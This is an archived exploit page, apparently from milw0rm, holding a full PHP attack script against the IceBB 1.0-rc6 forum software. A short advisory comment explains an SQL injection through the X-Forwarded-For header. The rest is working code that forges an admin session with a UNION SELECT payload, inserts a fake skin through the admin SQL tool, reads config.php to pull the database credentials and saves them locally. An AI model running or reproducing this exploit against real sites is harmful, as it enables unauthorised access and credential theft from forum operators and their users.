<html><head><title>IceBB 1.0-rc6 Remote Database Authentication Details Exploit</title></head><pre>&lt;?php
/*---------------------------------------------------------*\
IceBB 1.0-rc6 - Database Authentication Details Exploit

[|Description:|]
A security breach has been discoverd in IceBB 1.0-rc6.
This breach is caused by a bad filtering of the X-Forwarded-For variable:

&gt; ./includes/functions.php, line 73
$ip	 = empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_X_FORWARDED_FOR'];
$ip	= $this-&gt;clean_key($ip);
$input['ICEBB_USER_IP']	= $ip;

&gt; ./icebb.php, line 169
$icebb-&gt;client_ip	= $input['ICEBB_USER_IP'];

&gt; ./admin/index.php, line 112
$icebb-&gt;adsess	= $db-&gt;fetch_result(&quot;SELECT adsess.*,u.id as userid,u.username,u.temp_ban,g.g_view_board FROM icebb_adsess AS adsess LEFT JOIN icebb_users AS u ON u.username=adsess.user LEFT JOIN icebb_groups AS g ON u.user_group=g.gid WHERE adsess.asid='{$icebb-&gt;input['s']}' AND adsess.ip='{$icebb-&gt;client_ip}' LIMIT 1&quot;);

A hacker could exploit this security breach in order to alter a SQL request.

[|Advisory:|]
http://www.aeroxteam.fr/advisory-IceBB-1.0rc6.txt

[|Solution:|]
No one. Think about update your forum core when a patch will be available on the official website.

Discovered by Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)
for AeroX (AeroXteam.fr)
(C)opyleft 2007
Greetz: MathÂ², KERNEL_ERROR, NeoMorphS, Snake91, Goundy, Alkino (...) And everybody from #aerox
\*---------------------------------------------------------*/

if(count($argv) == 4) {
	head();
	if($argv[3] != 1 &amp;&amp; $argv[3] != 2) {
		die(&quot;\r\nIncorrect version !&quot;);
	} else {
		$version = $argv[3];
	}
	
	
	############## PART 1 ##############
	echo &quot;[+] Connecting... &quot;;
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	echo &quot;OK\r\n&quot;;
	echo &quot;[+] Getting tables prefix... &quot;;
	$query1  = &quot;GET &quot;.$argv[2].&quot;index.php?s=fake_sid&amp;act=sql HTTP/1.1\r\n&quot;;
	$query1 .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$query1 .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n&quot;;
	$query1 .= &quot;X-Forwarded-For: &quot;.getInj().&quot;\r\n&quot;;
	$query1 .= &quot;Accept: */*\r\n&quot;;
	$query1 .= &quot;Connection: Close\r\n\r\n&quot;;
	fwrite($sock, $query1);
	$result1 = '';
	while(!feof($sock)) {
		$result1 .= fgets($sock);
	}
	fclose($sock);
	if(preg_match(&quot;`&lt;tr&gt;&lt;td class='row2'&gt;&lt;a href='index\.php\?s=my_sessid&amp;act=sql&amp;amp;table=(.*?)adsess'&gt;`&quot;, $result1, $expreg)) {
		if($expreg[1] == '') {
			echo &quot;Failed\r\n\r\nExploit Failed :(&quot;;
			die();
		}
		$prefix = $expreg[1];
		echo &quot;OK (&quot;.$expreg[1].&quot;)\r\n&quot;;
	} else {
		echo &quot;Failed\r\n\r\nExploit Failed :(&quot;;
		die();
	}
	
	############## PART 2 ##############
	echo &quot;[+] Creating fake skin... &quot;;
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	$postdata2 = &quot;act=sql&amp;func=runquery&amp;query=INSERT+INTO+%60&quot;.$prefix.&quot;skins%60+%28%60skin_id%60%2C+%60skin_name%60%2C+%60skin_author%60%2C+%60skin_site%60%2C+%60skin_folder%60%2C+%60skin_preview%60%2C+%60skin_is_default%60%2C+%60skin_is_hidden%60%2C+%60skin_wrapper%60%2C+%60skin_macro_cache%60%2C+%60smiley_set%60%29+VALUES+%28666%2C+0x6F776E4564%2C+0x6834783072%2C+0x687474703A2F2F7777772E676F6F676C652E6672%2C+0x2E2E%2C+0x00%2C+0%2C+1%2C+0x00%2C+0x00%2C+0x00%29%3B&quot;;
	$query2  = &quot;POST &quot;.$argv[2].&quot;index.php?s=fake_sid HTTP/1.1\r\n&quot;;
	$query2 .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$query2 .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n&quot;;
	$query2 .= &quot;X-Forwarded-For: &quot;.getInj().&quot;\r\n&quot;;
	$query2 .= &quot;Accept: */*\r\n&quot;;
	$query2 .= &quot;Connection: Close\r\n&quot;;
	$query2 .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$query2 .= &quot;Content-Length: &quot;.strlen($postdata2).&quot;\r\n\r\n&quot;;
	$query2 .= $postdata2;
	fwrite($sock, $query2);
	$result2 = '';
	while(!feof($sock)) {
		$result2 .= fgets($sock);
	}
	fclose($sock);
	if(strpos($result2, &quot;&lt;textarea name='query' rows='5' cols='50'&gt;INSERT INTO `&quot;.$prefix.&quot;skins` (`skin_id`, `skin_name`, `skin_author`, `skin_site`, `skin_folder`, `skin_preview`, `skin_is_default`, `skin_is_hidden`, `skin_wrapper`, `skin_macro_cache`, `smiley_set`) VALUES (666, 0x6F776E4564, 0x6834783072, 0x687474703A2F2F7777772E676F6F676C652E6672, 0x2E2E, 0x00, 0, 1, 0x00, 0x00, 0x00);&lt;/textarea&gt;&quot;) === FALSE) {
		echo &quot;Failed. Maybe Skin already exists ?\r\n&quot;;
	} else {
		echo &quot;OK\r\n&quot;;
	}
	
	
	############## PART 3 ##############
	echo &quot;[+] Getting config.php... &quot;;
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	$query3  = &quot;GET &quot;.$argv[2].&quot;index.php?s=fake_sid&amp;act=skins&amp;func=templates&amp;skinid=666&amp;code=edit&amp;template=config HTTP/1.1\r\n&quot;;
	$query3 .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$query3 .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n&quot;;
	$query3 .= &quot;X-Forwarded-For: &quot;.getInj().&quot;\r\n&quot;;
	$query3 .= &quot;Accept: */*\r\n&quot;;
	$query3 .= &quot;Connection: Close\r\n\r\n&quot;;
	fwrite($sock, $query3);
	$result3 = '';
	while(!feof($sock)) {
		$result3 .= fgets($sock);
	}
	fclose($sock);
	if(preg_match(&quot;`(&lt;\?php.*\?&gt;)`s&quot;, $result3, $expreg2)) {
		echo &quot;OK\r\n\r\n&quot;;
		echo $expreg2[1];
	} else {
		echo &quot;Failed\r\n\r\nExploit Failed :(&quot;;
	}
	
	
	############## PART 4 ##############
	echo &quot;\r\n\r\n[+] Removing fake skin... &quot;;
	$sock = fsockopen($argv[1], 80, $eno, $estr, 30);
	if (!$sock) {
		die(&quot;Failed\r\n\r\nCould not connect to &quot;.$argv[1].&quot; on the port 80 !&quot;);
	}
	$query4  = &quot;GET &quot;.$argv[2].&quot;index.php?s=fake_sid&amp;act=skins&amp;func=disable&amp;skinid=666 HTTP/1.1\r\n&quot;;
	$query4 .= &quot;Host: &quot;.$argv[1].&quot;\r\n&quot;;
	$query4 .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9\r\n&quot;;
	$query4 .= &quot;X-Forwarded-For: &quot;.getInj().&quot;\r\n&quot;;
	$query4 .= &quot;Accept: */*\r\n&quot;;
	$query4 .= &quot;Connection: Close\r\n\r\n&quot;;
	fwrite($sock, $query4);
	fclose($sock);
	echo &quot;OK\r\n\r\n&quot;;
	echo &quot;Do you want to create a local config.php file ? (Y/N) &quot;;
	$a = strtoupper(trim(fgets(STDIN)));
	if($a == 'Y') {
		$handle = fopen('config_'.$argv[1].'_'.time().'.php', 'w');
		fwrite($handle, $expreg2[1]);
		fclose($handle);
	}
	
} else {
	usage();
}
function getInj() {
	global $version;
	if($version == 1) {
		return &quot;' AND 1=2 UNION SELECT 'my_sessid' as asid, 'lol' as user, '127.0.0.1' as ip, &quot;.(time() - 60).&quot; as logintime, 'home' as location, &quot;.(time() - 55).&quot; as last_action, 1 as userid, 'lol' as username /*&quot;;
	} elseif($version == 2) {
		return &quot;' AND 1=2 UNION SELECT 'my_sessid' as asid, 'lol' as user, '127.0.0.1' as ip, &quot;.(time() - 60).&quot; as logintime, 'home' as location, &quot;.(time() - 55).&quot; as last_action, 1 as userid, 'lol' as username, 0 as temp_ban, 1 as g_view_board /*&quot;;
	}
}
function usage() {
	echo &quot;+-------------------------------------------------------+\r\n&quot;;
	echo &quot;|   IceBB &lt;= 1.0-rc6 Database Authentication Details    |\r\n&quot;;
	echo &quot;|             By Gu1ll4um3r0m41n for AeroX              |\r\n&quot;;
	echo &quot;| Usage: php exploit.php site.com /pathtoadmin/ version |\r\n&quot;;
	echo &quot;|                Version:   1 = rc5                     |\r\n&quot;;
	echo &quot;|                           2 = rc6                     |\r\n&quot;;
	echo &quot;+-------------------------------------------------------+\r\n&quot;;
}
function head() {
	echo &quot;+--------------------------------------------------+\r\n&quot;;
	echo &quot;| IceBB &lt;= 1.0-rc6 Database Authentication Details |\r\n&quot;;
	echo &quot;|           By Gu1ll4um3r0m41n for AeroX           |\r\n&quot;;
	echo &quot;+--------------------------------------------------+\r\n\r\n&quot;;
}
?&gt;

# milw0rm.com [2007-11-18]</pre></html>